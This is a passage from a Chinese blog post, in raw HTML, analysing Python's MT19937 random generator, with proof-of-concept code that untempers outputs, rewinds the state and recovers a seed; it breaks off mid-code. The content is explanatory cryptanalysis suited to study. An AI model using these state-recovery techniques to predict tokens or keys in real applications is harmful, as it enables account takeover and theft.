d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>实现了倒带过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rewindState</span>(<span class="params">state</span>):</span><br><span class="line">    prev = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    <span class="comment"># copy to not modify input array</span></span><br><span class="line">    s = state[:]</span><br><span class="line">    I, I0 = invertStep(s[<span class="number">623</span>], s[<span class="number">396</span>])</span><br><span class="line">    prev[<span class="number">623</span>] += I</span><br><span class="line">    <span class="comment"># update state 0</span></span><br><span class="line">    <span class="comment"># this does nothing when working with a known full state, but is important we rewinding more than 1 time</span></span><br><span class="line">    s[<span class="number">0</span>] = (s[<span class="number">0</span>]&amp;<span class="number">0x80000000</span>) + I0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">227</span>, <span class="number">623</span>):</span><br><span class="line">        I, I1 = invertStep(s[i], s[i-<span class="number">227</span>])</span><br><span class="line">        prev[i] += I</span><br><span class="line">        prev[i+<span class="number">1</span>] += I1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">227</span>):</span><br><span class="line">        I, I1 = invertStep(s[i], prev[i+<span class="number">397</span>])</span><br><span class="line">        prev[i] += I</span><br><span class="line">        prev[i+<span class="number">1</span>] += I1</span><br><span class="line">    <span class="comment"># The LSBs of prev[0] do not matter, they are 0 here</span></span><br><span class="line">    <span class="keyword">return</span> prev</span><br></pre></td></tr></table></figure><p>上面的代码实际上利用所有生成的当前状态去反推初始状态，逻辑还是很简单的</p><p>下面是POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftRight</span>(<span class="params">x, shift</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ res &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftLeft</span>(<span class="params">x, shift, mask</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untemper</span>(<span class="params">v</span>):</span><br><span class="line">    v = unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">    v = unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertStep</span>(<span class="params">si, si227</span>):</span><br><span class="line">    <span class="comment"># S[i] ^ S[i-227] == (((I[i] &amp; 0x80000000) | (I[i+1] &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ (0x9908b0df if I[i+1] &amp; 1 else 0)</span></span><br><span class="line">    X = si ^ si227</span><br><span class="line">    <span class="comment"># we know the LSB of I[i+1] because MSB of 0x9908b0df is set, we can see if the XOR has been applied</span></span><br><span class="line">    mti1 = (X &amp; <span class="number">0x80000000</span>) &gt;&gt; <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> mti1:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line">    <span class="comment"># undo shift right</span></span><br><span class="line">    X &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="comment"># now recover MSB of state I[i]</span></span><br><span class="line">    mti = X &amp; <span class="number">0x80000000</span></span><br><span class="line">    <span class="comment"># recover the rest of state I[i+1]</span></span><br><span class="line">    mti1 += X &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> mti, mti1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rewindState</span>(<span class="params">state</span>):</span><br><span class="line">    prev = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    <span class="comment"># copy to not modify input array</span></span><br><span class="line">    s = state[:]</span><br><span class="line">    I, I0 = invertStep(s[<span class="number">623</span>], s[<span class="number">396</span>])</span><br><span class="line">    prev[<span class="number">623</span>] += I</span><br><span class="line">    <span class="comment"># update state 0</span></span><br><span class="line">    <span class="comment"># this does nothing when working with a known full state, but is important we rewinding more than 1 time</span></span><br><span class="line">    s[<span class="number">0</span>] = (s[<span class="number">0</span>]&amp;<span class="number">0x80000000</span>) + I0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">227</span>, <span class="number">623</span>):</span><br><span class="line">        I, I1 = invertStep(s[i], s[i-<span class="number">227</span>])</span><br><span class="line">        prev[i] += I</span><br><span class="line">        prev[i+<span class="number">1</span>] += I1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">227</span>):</span><br><span class="line">        I, I1 = invertStep(s[i], prev[i+<span class="number">397</span>])</span><br><span class="line">        prev[i] += I</span><br><span class="line">        prev[i+<span class="number">1</span>] += I1</span><br><span class="line">    <span class="comment"># The LSBs of prev[0] do not matter, they are 0 here</span></span><br><span class="line">    <span class="keyword">return</span> prev</span><br><span class="line"></span><br><span class="line">I = <span class="built_in">list</span>(random.getstate()[<span class="number">1</span>][:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">S1 = [untemper(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line">S2 = [untemper(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line">S3 = [untemper(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># rewind once</span></span><br><span class="line">I_ = rewindState(S1)</span><br><span class="line">S2_ = rewindState(S3)</span><br><span class="line">S1_ = rewindState(S2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(I_ == I)</span><br><span class="line"><span class="built_in">print</span>(S1_[<span class="number">1</span>:] == S1[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(S2_[<span class="number">1</span>:] == S2[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># rewind multiple times</span></span><br><span class="line">I_ = rewindState(rewindState(rewindState(S3)))</span><br><span class="line"><span class="built_in">print</span>(I_ == I)</span><br><span class="line"><span class="built_in">print</span>(I_[:<span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(I[:<span class="number">5</span>])</span><br></pre></td></tr></table></figure><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250508182451.png" alt="微信截图_20250508182451"></p><p>执行完上面的POC之后我们恢复了完整的初始状态，接下来就是恢复种子，我们将利用下面的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">seedArrayFromState</span>(<span class="params">s, subtractIndices=<span class="literal">True</span></span>):</span><br><span class="line">    s_ = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>, <span class="number">2</span>, -<span class="number">1</span>):</span><br><span class="line">        s_[i] = recover_Ji_from_Ii(s[i], s[i-<span class="number">1</span>], i)</span><br><span class="line">    s_[<span class="number">0</span>]=s_[<span class="number">623</span>]</span><br><span class="line">    s_[<span class="number">1</span>]=recover_Ji_from_Ii(s[<span class="number">1</span>], s[<span class="number">623</span>],  <span class="number">1</span>)</span><br><span class="line">    s_[<span class="number">2</span>]=recover_Ji_from_Ii(s[<span class="number">2</span>], s_[<span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line">    seed = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>, <span class="number">2</span>, -<span class="number">1</span>):</span><br><span class="line">        seed[i-<span class="number">1</span>] = recover_kj_from_Ji(s_[i], s_[i-<span class="number">1</span>], i)</span><br><span class="line">    <span class="comment"># system overdefined for seed[0,1,623]</span></span><br><span class="line">    seed[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="comment"># thus s1 = (const[1] ^ ((const[0] ^ (const[0] &gt;&gt; 30))*1664525))</span></span><br><span class="line">    s1_old = ((<span class="number">2194844435</span> ^ ((<span class="number">19650218</span> ^ (<span class="number">19650218</span> &gt;&gt; <span class="number">30</span>))*<span class="number">1664525</span>))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    seed[<span class="number">1</span>] = recover_kj_from_Ji(s_[<span class="number">2</span>], s1_old, <span class="number">2</span>)</span><br><span class="line">    seed[<span class="number">623</span>] = (s_[<span class="number">1</span>] - (s1_old ^ ((s_[<span class="number">0</span>] ^ (s_[<span class="number">0</span>] &gt;&gt; <span class="number">30</span>))*<span class="number">1664525</span>))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># subtract the j indices</span></span><br><span class="line">    <span class="keyword">if</span> subtractIndices:</span><br><span class="line">        seed = [(<span class="number">2</span>**<span class="number">32</span>+e-i)%<span class="number">2</span>**<span class="number">32</span> <span class="keyword">for</span> i,e <span class="keyword">in</span> <span class="built_in">enumerate</span>(seed)]</span><br><span class="line">    <span class="keyword">return</span> seed</span><br></pre></td></tr></table></figure><p>但是 <code>init_by_array</code> 函数执行种子初始化操作的方式导致了不同的<code>init_key</code>数组可能会生成出相同的初始化状态<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.14ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 504 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container>，即种子与初始化状态不是一一对应的，这就造成了种子冲突的可能性</p><p>这里原文章中提出了一种解决方案，我们可以固定<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="2.908ex" height="1.92ex" role="img" focusable="false" viewbox="0 -683 1285.6 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g><g data-mml-node="mn" transform="translate(882,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></g></svg></mjx-container>为一个数，这样使得我们反推<code>init_key</code>时简化解空间，实现种子恢复的唯一性，这里其实也好理解就相当于一个不定方程<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="10.448ex" height="1.971ex" role="img" focusable="false" viewbox="0 -666 4618 871"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(1794.4,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(2562.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(3618,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g></g></g></svg></mjx-container>，我们存在非常多种可能解，我们这里固定<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="5.442ex" height="1.692ex" role="img" focusable="false" viewbox="0 -666 2405.6 748"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(1905.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></svg></mjx-container>，那么 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="6.388ex" height="1.971ex" role="img" focusable="false" viewbox="0 -666 2823.6 871"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(1823.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g></g></g></svg></mjx-container> ，即我们从大量的可能中选择一个作为我们的结果，这里原文章选择固定<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="7.057ex" height="1.92ex" role="img" focusable="false" viewbox="0 -683 3119.1 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g><g data-mml-node="mn" transform="translate(882,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g><g data-mml-node="mo" transform="translate(1563.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(2619.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></svg></mjx-container></p><p>实现这一过程的POC如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seedArrayToInt</span>(<span class="params">s</span>):</span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> s[::-<span class="number">1</span>]:</span><br><span class="line">        seed += e</span><br><span class="line">        seed &lt;&lt;= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> seed &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># random is not manually seeded so it uses 624 random values</span></span><br><span class="line"></span><br><span class="line">S = [untemper(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line">I = rewindState(S)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Normal run :"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.randbytes(<span class="number">4</span>).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(random.randrange(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"\nReseeded run :"</span>)</span><br><span class="line"></span><br><span class="line">seed_array = seedArrayFromState(I)</span><br><span class="line">seed = seedArrayToInt(seed_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the recovered seed is very big. Too big to be printed in decimal</span></span><br><span class="line"><span class="comment"># print(hex(seed))</span></span><br><span class="line">random.seed(seed)</span><br><span class="line"></span><br><span class="line">S_ = [untemper(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span 